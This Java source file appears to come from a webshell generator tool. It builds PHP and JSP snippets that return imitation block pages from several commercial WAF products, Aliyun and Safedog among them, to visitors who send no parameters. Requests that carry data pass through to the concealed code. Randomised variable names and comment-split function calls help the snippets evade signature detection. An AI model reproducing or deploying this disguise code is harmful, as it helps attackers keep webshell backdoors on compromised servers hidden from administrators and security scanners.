package pretend;

import application.JspPanel;
import application.PhpPanel;
import application.RandomString;

public class HtmlPretend {

    public String pretendHtml;
    public String key;

    public HtmlPretend() {
    }

    public String GetPhp(String name){

        switch (name){
            case "custom":
                this.pretendHtml = SetPhp(PhpPanel.pretendJTextField.getText(),"200");
                break;
            case "AliyunWAF":
                this.pretendHtml = SetPhp(AliyunWAF.GetHtml(), AliyunWAF.getCode());
                break;
            case "T-mshenWAF":
                this.pretendHtml = SetPhp(TmshenWAF.GetHtml(), TmshenWAF.getCode());
                break;
            case "T-secWAF":
                this.pretendHtml = SetPhp(TsecWAF.GetHtml(), TsecWAF.getCode());
                break;
            case "AnyuWAF":
                this.pretendHtml = SetPhp(AnyuWAF.GetHtml(), AnyuWAF.getCode());
                break;
            case "SafeLineWAF":
                this.pretendHtml = SetPhp(SafeLineWAF.GetHtml(), SafeLineWAF.getCode());
                break;
            case "SafedogWAF":
                this.pretendHtml = SetPhp(SafedogWAF.GetHtml(), SafedogWAF.getCode());
                break;
            case "WangsuWAF":
                this.pretendHtml = SetPhp(WangsuWAF.GetHtml(), WangsuWAF.getCode());
                break;
            default:
                this.pretendHtml = "";
        }
        return pretendHtml;
    }

    public String GetJsp7(String name){

        switch (name){
            case "custom":
                this.pretendHtml = SetJsp7(JspPanel.pretendJTextField.getText(),"200");
                break;
            case "AliyunWAF":
                this.pretendHtml = SetJsp7(AliyunWAF.GetHtml(), AliyunWAF.getCode());
                break;
            case "T-mshenWAF":
                this.pretendHtml = SetJsp7(TmshenWAF.GetHtml(), TmshenWAF.getCode());
                break;
            case "T-secWAF":
                this.pretendHtml = SetJsp7(TsecWAF.GetHtml(), TsecWAF.getCode());
                break;
            case "AnyuWAF":
                this.pretendHtml = SetJsp7(AnyuWAF.GetHtml(), AnyuWAF.getCode());
                break;
            case "SafeLineWAF":
                this.pretendHtml = SetJsp7(SafeLineWAF.GetHtml(), SafeLineWAF.getCode());
                break;
            case "SafedogWAF":
                this.pretendHtml = SetJsp7(SafedogWAF.GetHtml(), SafedogWAF.getCode());
                break;
            case "WangsuWAF":
                this.pretendHtml = SetJsp7(WangsuWAF.GetHtml(), WangsuWAF.getCode());
                break;
            default:
                this.pretendHtml = "";
        }
        return pretendHtml;
    }

    public String GetJsp9(String name){

        switch (name){
            case "custom":
                this.pretendHtml = SetJsp9(JspPanel.pretendJTextField.getText(),"200");
                break;
            case "AliyunWAF":
                this.pretendHtml = SetJsp9(AliyunWAF.GetHtml(), AliyunWAF.getCode());
                break;
            case "T-mshenWAF":
                this.pretendHtml = SetJsp9(TmshenWAF.GetHtml(), TmshenWAF.getCode());
                break;
            case "T-secWAF":
                this.pretendHtml = SetJsp9(TsecWAF.GetHtml(), TsecWAF.getCode());
                break;
            case "AnyuWAF":
                this.pretendHtml = SetJsp9(AnyuWAF.GetHtml(), AnyuWAF.getCode());
                break;
            case "SafeLineWAF":
                this.pretendHtml = SetJsp9(SafeLineWAF.GetHtml(), SafeLineWAF.getCode());
                break;
            case "SafedogWAF":
                this.pretendHtml = SetJsp9(SafedogWAF.GetHtml(), SafedogWAF.getCode());
                break;
            case "WangsuWAF":
                this.pretendHtml = SetJsp9(WangsuWAF.GetHtml(), WangsuWAF.getCode());
                break;
            default:
                this.pretendHtml = "";
        }
        return pretendHtml;
    }

    public String SetPhp(String name,String code){
        this.key = RandomString.getRString(6);
        this.pretendHtml = "\r\n$"+this.key+" = \""+name+"\";\r\n" +
                "if( count($_REQUEST) || file_get_contents(\"php://input\") ){\r\n" +
                "\r\n"+
                "}else{\r\n" +
                "    header('Content-Type:text/html;charset=utf-8');"+
                "    http_response_code("+code+");\r\n" +
                "    echo base64_decode/**/($"+this.key+");\r\n" +
                "}";
        return pretendHtml;
    }

    public String SetJsp7(String name,String code){
        this.key = RandomString.getRString(6);
        this.pretendHtml =
                "\r\n<%\r\n" +
                        "        String g"+this.key+" = \""+name+"\";\r\n"+
                        "        if(request.getParameterMap().size()!=0 || request.getReader().read()!=-1){\r\n" +
                        "        }else {\r\n" +
                        "            response.setStatus("+code+");\r\n" +
                        "            byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(g"+this.key+");\r\n" +
                        "            out.println(new String(bytes));\r\n" +
                        "        }\r\n" +
                        "%>\r\n";
        return pretendHtml;
    }

    public String SetJsp9(String name,String code){
        this.key = RandomString.getRString(6);
        this.pretendHtml =
                "\r\n<%\r\n" +
                "        String g"+this.key+" = \""+name+"\";\r\n"+
                "        if(request.getParameterMap().size()!=0 || request.getReader().read()!=-1){\r\n" +
                "        }else {\r\n" +
                "            response.setStatus("+code+");\r\n" +
                "            byte[] bytes = Base64.getDecoder().decode(g"+this.key+");\r\n" +
                "            out.println(new String(bytes));\r\n" +
                "        }\r\n" +
                "%>\r\n";
        return pretendHtml;
    }


}
